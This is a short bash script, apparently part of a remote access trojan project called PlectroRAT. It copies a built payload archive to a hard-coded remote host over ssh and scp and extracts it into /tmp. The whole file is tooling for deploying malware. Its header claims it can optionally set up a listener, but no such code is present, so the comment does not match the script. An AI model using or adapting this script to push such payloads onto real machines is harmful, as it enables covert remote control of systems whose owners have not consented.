#!/bin/bash

# Deployment script for PlectroRAT
# Transfers payload to remote host and optionally sets up a listener

REMOTE_USER="user"
REMOTE_HOST="192.168.1.100"
REMOTE_DIR="/tmp/plectro"
PAYLOAD="../build/plectro_payload.zip"

echo "[*] Verifying payload..."
if [ ! -f "$PAYLOAD" ]; then
    echo "[!] Payload not found: $PAYLOAD"
    exit 1
fi

echo "[*] Creating remote directory..."
ssh "$REMOTE_USER@$REMOTE_HOST" "mkdir -p $REMOTE_DIR"

echo "[*] Transferring payload..."
scp "$PAYLOAD" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DIR"

echo "[*] Extracting payload on remote..."
ssh "$REMOTE_USER@$REMOTE_HOST" "unzip -o $REMOTE_DIR/plectro_payload.zip -d $REMOTE_DIR"

echo "[*] Deployment complete."
